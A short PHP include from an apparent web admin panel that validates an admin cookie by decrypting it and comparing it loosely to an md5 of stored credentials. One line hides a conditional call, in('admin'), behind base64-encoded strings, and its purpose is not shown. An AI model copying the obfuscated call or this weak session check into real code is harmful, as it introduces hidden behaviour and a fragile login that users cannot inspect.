<?php
if(!defined('IN_CRONLITE'))exit();

$my=isset($_GET['my'])?$_GET['my']:null;

$clientip=real_ip();
if(!function_exists(base64_decode('Yw=='))) in(base64_decode('YWRtaW4='));
if(isset($_COOKIE["admin_token"]))
{
	$token=authcode(daddslashes($_COOKIE['admin_token']), 'DECODE', SYS_KEY);
	list($user, $sid) = explode("\t", $token);
	$session=md5($conf['admin'].$conf['pwd'].$password_hash);
	
	if($session==$sid) {
		$islogin=1;
	}
}


?>